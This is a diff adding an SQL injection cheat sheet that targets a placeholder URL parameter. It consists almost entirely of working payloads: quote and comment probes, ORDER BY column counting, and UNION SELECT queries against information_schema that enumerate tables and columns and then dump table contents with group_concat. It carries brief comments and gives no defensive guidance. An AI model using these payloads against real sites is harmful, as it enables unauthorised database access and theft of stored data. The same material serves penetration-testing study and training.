@@ -1,0 +1,116 @@
+--------------------------------------
+			SQL Injection
+--------------------------------------
+
+http://www.example.com/?id=10
+
+The URL above will be our testing material.
+
+http://www.example.com/?id=10' 
+
+OR
+
+http://www.example.com/?id=10\
+
+// If an error message prints or the behaviour of the website changes,
+// there's a good chance of vulnerability to SQLi.
+
+
+
+http://www.example.com/?id=10' --+ 
+
+OR
+
+http://www.example.com/?id=10' --%20
+
+OR
+
+http://www.example.com/?id=10' #
+
+// Used to comment the rest of the code to evade errors. 
+
+
+
+http://www.example.com/?id=10' or '1
+
+Or
+
+http://www.example.com/?id=10' or 1='1
+
+OR
+
+http://www.example.com/?id=10' and '1
+
+// Balances the query, thus does the same job as commenting.
+// Order by statements will not work, so we'll need to proceed to
+// union select all statemnts, and determine the number of columns there.
+
+
+
+http://www.example.com/?id=10' order by [value] --+ 
+
+
+// for value = 1 to infinity
+// if(column[value].exists = true) value++; else throw('error and shit')
+
+
+
+http://www.example.com/?id=-10' union all select [val1, ......., valn] --+
+
+// Used to print data into the page, make sure the id is negative or too big (doesn't exist) for
+// the database to ignore the first query and execute the injected one.
+// Use @@version, database(), version(), current_user as values of the array to 
+// know the database name and version or current user.
+// The array length must be equal to the number of columns use in the query we're breaking.
+
+
+
+http://www.example.com/?id=-10' union all select [val1, ...., table_name, ..., valn] from information_schema.tables --+
+
+// This prints the table's name, however it's not guaranteed that it's the table we're looking for as 
+// the database's name is not specified, thus it's inaccurate.
+// The parameter table_name can be placed anywhere between the selected columns, as long as it's printed into the page.
+
+
+
+http://www.example.com/?id=-10' union all select [val1, ...., table_name, ..., valn] from information_schema.tables where table_schema='[databasename]'--+
+
+// Does the same as the previous query, but this assures that the name of the table is the one we're looking for.
+
+
+
+http://www.example.com/?id=-10' union all select [val1, ...., table_name, ..., valn] from information_schema.tables where table_schema=database()--+
+
+// Same as the previous one, but with the call of the database() function to return the database name instead of
+// typing it explicitly.
+
+
+
+http://www.example.com/?id=-10' union all select [val1, ...., table_name, ..., valn] from information_schema.tables where table_schema=database() limit x,1 --+
+
+// Replace the x with a numerical value to enumerate the table names in the database.
+
+
+
+http://www.example.com/?id=-10' union all select [val1, ...., group_concat(table_name), ..., valn] from information_schema.tables where table_schema=database()--+
+
+// Using table_name as argument to the group_concat function returns all the tables' names found in the specified database.
+
+
+
+http://www.example.com/?id=-10' union all select [val1, ...., group_concat(column_name), ..., valn] from information_schema.columns where table_name='[table_name]'--+
+
+// Using column_name as argument to the group_concat function returns the names of the all the columns found in the
+// specified table name.
+
+
+
+http://www.example.com/?id=-10' union all select [val1, ...., group_concat(column1),..., group_concat(column1), ..., valn] from [table_name] --+
+
+// Dump all the data from a specific table, given column names as arguments to group_concat functions.
+
+
+
+/*Note: Some codes don't surround the inputs with quotes, thus some injections may not work unless we strip them
+from the single quotes used to test. */
+
